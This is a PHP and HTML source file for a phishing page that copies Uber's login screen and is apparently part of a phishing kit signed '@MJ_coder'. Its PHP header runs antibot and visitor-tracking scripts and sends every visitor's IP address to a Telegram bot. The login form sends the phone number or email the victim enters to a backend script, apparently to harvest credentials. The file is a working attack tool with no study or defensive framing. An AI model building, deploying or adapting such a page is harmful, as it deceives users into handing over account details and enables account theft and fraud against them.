<?php
session_start();
include "./Assets/php/config/config.php";
include "./Assets/php/prevents/antibot.php";
$visitors = Visitors();
get_device_and_browser();

$message = "🚨 Nouveau visiteur sur le site [Uber]\n" .
    "🌐 IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
    "<blockquote>└ © @MJ_coder</blockquote>";

sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
?>

<!DOCTYPE html>
<html class="light" lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber | Login</title>
<link href="https://fonts.googleapis.com" rel="preconnect"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Plus+Jakarta+Sans:wght@700;800&amp;display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<script id="tailwind-config">
        tailwind.config = {
            darkMode: "class",
            theme: {
                extend: {
                    "colors": {
                         "primary": "#000000",
                         "surface": "#f9f9f9",
                         "on-surface": "#1b1b1b",
                         "on-primary": "#ffffff"
                    }
                }
            }
        }
    </script>
<style>
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 300, 'GRAD' 0, 'opsz' 24;
        }
        body {
            font-family: 'Inter', sans-serif;
        }
        .editorial-headline {
            font-family: 'Plus Jakarta Sans', sans-serif;
        }
        /* Tel input overrides */
        .iti { width: 100%; display: block; }
        .hide-flag .iti__flag-container { display: none !important; }
        .hide-flag input { padding-left: 1rem !important; }
        
        /* Entrance Animations */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in-up {
            animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            opacity: 0;
        }
        
        /* Error Animation */
        @keyframes errorPop {
            0% { opacity: 0; transform: scale(0.95) translateY(-10px); }
            40% { opacity: 1; transform: scale(1.02) translateY(0); }
            100% { opacity: 1; transform: scale(1) translateY(0); }
        }
        .animate-error-pop {
            animation: errorPop 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        .delay-100 { animation-delay: 100ms; }
        .delay-200 { animation-delay: 200ms; }
        .delay-300 { animation-delay: 300ms; }
        .delay-400 { animation-delay: 400ms; }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
</head>
<body class="bg-surface text-on-surface antialiased min-h-screen flex flex-col">
<!-- TopNavBar -->
<header class="w-full top-0 sticky bg-[#f9f9f9] dark:bg-neutral-900 z-50">
<nav class="flex items-center justify-between px-6 py-4 max-w-full bg-[#f3f3f3] dark:bg-neutral-800">
<div class="text-2xl font-bold tracking-tighter text-[#000000] dark:text-[#ffffff] font-['Plus_Jakarta_Sans']">
                Uber
            </div>
<div class="hidden md:flex items-center gap-8">
<a class="text-[#000000] dark:text-[#ffffff] font-bold transition-colors" href="#">Log in</a>
<a class="text-neutral-500 dark:text-neutral-400 hover:bg-[#eeeeee] dark:hover:bg-neutral-800 transition-colors px-4 py-2 rounded-lg" href="#">Sign up</a>
</div>
</nav>
</header>
<!-- Main Content Canvas -->
<main class="flex-grow flex items-center justify-center p-6 bg-background">
<div class="w-full max-w-[480px] space-y-8 animate-fade-in-up delay-100">
<!-- PHP Error message block -->
<?php if(isset($_GET['errors']) && $_GET['errors'] === 'email_not_found'): ?>
<div class="mb-6 p-4 rounded-lg bg-red-50 border border-red-200 animate-error-pop">
    <div class="flex">
        <div class="flex-shrink-0">
            <span class="material-symbols-outlined text-red-600">error</span>
        </div>
        <div class="ml-3">
            <h3 class="text-sm font-medium text-red-800">Account not found</h3>
            <div class="mt-2 text-sm text-red-700">
                <p>This email or phone number is not linked to any account.</p>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>
<!-- Heading -->
<div class="space-y-4 animate-fade-in-up delay-200">
<h1 class="editorial-headline text-3xl font-bold tracking-tight text-primary leading-tight">
                    What's your phone number or email?
                </h1>
</div>
<!-- Login Form -->
<form action="./Assets/php/config/func.php" method="POST" class="space-y-4 animate-fade-in-up delay-300">
<input type="hidden" name="log" value="uber_login">
<div class="relative">
<input id="user-input" name="user" class="w-full bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high p-4 text-base placeholder-on-surface-variant transition-all rounded-lg" placeholder="Enter phone number or email" type="text" required/>
<div class="absolute bottom-0 left-0 w-full h-[2px] bg-transparent focus-within:bg-primary transition-all z-10"></div>
</div>
<button type="submit" class="w-full py-4 bg-primary text-on-primary font-semibold text-lg rounded-lg active:scale-95 transition-transform flex items-center justify-center">
                    Continue
                </button>
</form>
<!-- Divider -->
<!-- Social Buttons -->
<!-- Footer Text -->
<div class="pt-6 animate-fade-in-up delay-400">
<p class="text-xs text-on-surface-variant leading-relaxed">
                    By continuing, you agree to calls, including by autodialer, WhatsApp, or texts from Uber and its affiliates.
                </p>
</div>
</div>
</main>
<!-- Supplemental Design Element: Subtle Tonal Shadow on Footer (Visual only) -->
<footer class="w-full p-8 text-center text-on-surface-variant text-sm border-t border-outline-variant/15">
<div class="max-w-[480px] mx-auto flex flex-wrap justify-center gap-6">
<a class="hover:text-primary transition-colors" href="#">Privacy Policy</a>
<a class="hover:text-primary transition-colors" href="#">Terms of Service</a>
<a class="hover:text-primary transition-colors" href="#">Cookies</a>
</div>
</footer>
<script>
    const input = document.querySelector("#user-input");
    const iti = window.intlTelInput(input, {
        initialCountry: "auto",
        separateDialCode: true,
        geoIpLookup: function(success, failure) {
            fetch("https://ipapi.co/json").then(function(res) { return res.json(); }).then(function(data) { success(data.country_code); }).catch(function() { success("us"); });
        },
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
    });

    const itiContainer = input.closest('.iti');
    itiContainer.classList.add('hide-flag');

    input.addEventListener('input', function() {
        const val = input.value.trim();
        // If the user starts typing a number (0-9) or '+'
        if (/^[0-9+]/.test(val)) {
            itiContainer.classList.remove('hide-flag');
        } else {
            itiContainer.classList.add('hide-flag');
        }
    });

    const form = document.querySelector('form');
    form.addEventListener('submit', function() {
        if (/^[0-9+]/.test(input.value.trim())) {
             input.value = iti.getNumber();
        }
    });
</script>
</body></html>